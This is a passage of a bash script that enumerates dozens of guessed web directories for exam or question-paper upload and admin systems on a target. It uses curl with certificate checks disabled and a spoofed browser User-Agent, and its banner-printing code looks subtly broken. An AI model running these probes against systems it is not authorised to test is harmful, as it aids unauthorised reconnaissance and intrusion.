payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataSyncQPProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataSyncQPProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAdminDataPipeline/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAdminDataPipeline/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBFileHandling/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBFileHandling/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPServiceBulkUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPServiceBulkUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["CloudSync-QPSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"CloudSync-QPSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BatchProcessorQPProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BatchProcessorQPProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUpload_CloudSync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUpload_CloudSync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPManager-AutomationSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPManager-AutomationSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Processing_QPaperDoc/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Processing_QPaperDoc/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMaster-BatchProcessor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMaster-BatchProcessor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAutoAutoUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAutoAutoUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["HandlingModule-QPBulk/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"HandlingModule-QPBulk/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAdmin_Tool/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAdmin_Tool/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMgmt_Processing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMgmt_Processing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAdmin-Admin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAdmin-Admin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ExamPaper_DatabaseManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ExamPaper_DatabaseManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMgmtMassUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMgmtMassUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBData_CloudSync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBData_CloudSync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["MonitoringTool-Q_P/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"MonitoringTool-Q_P/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBulk-Service/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBulk-Service/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QsnPaper-DatabaseManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QsnPaper-DatabaseManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPDatabase-Monitoring/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPDatabase-Monitoring/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Admin-TestPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Admin-TestPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataPipelineQPService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataPipelineQPService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUploaderUploader/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUploaderUploader/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaper-Uploader/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaper-Uploader/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Q_P-AutoUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Q_P-AutoUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["FileUpload_ExamPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"FileUpload_ExamPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AccessControl_ExamPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AccessControl_ExamPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPControl-Manager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPControl-Manager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaper_Platform/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaper_Platform/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Portal-QPControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Portal-QPControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataUpload-QPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataUpload-QPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Q_PCloudSync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Q_PCloudSync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPService-MonitoringTool/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPService-MonitoringTool/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBulk_DataOps/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBulk_DataOps/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataUpload_QP/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataUpload_QP/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QuestionPaper_Service/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QuestionPaper_Service/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPFilePortal/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPFilePortal/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBFile-Management/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBFile-Management/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["PortalQPBFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"PortalQPBFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Q_PFileProcessor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Q_PFileProcessor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Handler_QPControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Handler_QPControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["UploaderQPB/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"UploaderQPB/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPControl-Upload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPControl-Upload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Platform-QPMaster/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Platform-QPMaster/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QP-Service/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QP-Service/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPB-Admin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPB-Admin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QsnPaperSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QsnPaperSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Uploader-QPBatch/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Uploader-QPBatch/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ProcessingQPAdmin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ProcessingQPAdmin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPDatabaseDataProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPDatabaseDataProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPControl-DataSync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPControl-DataSync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBData_Monitoring/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBData_Monitoring/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Upload-QPBData/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Upload-QPBData/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["System_QPMaster/"]: "
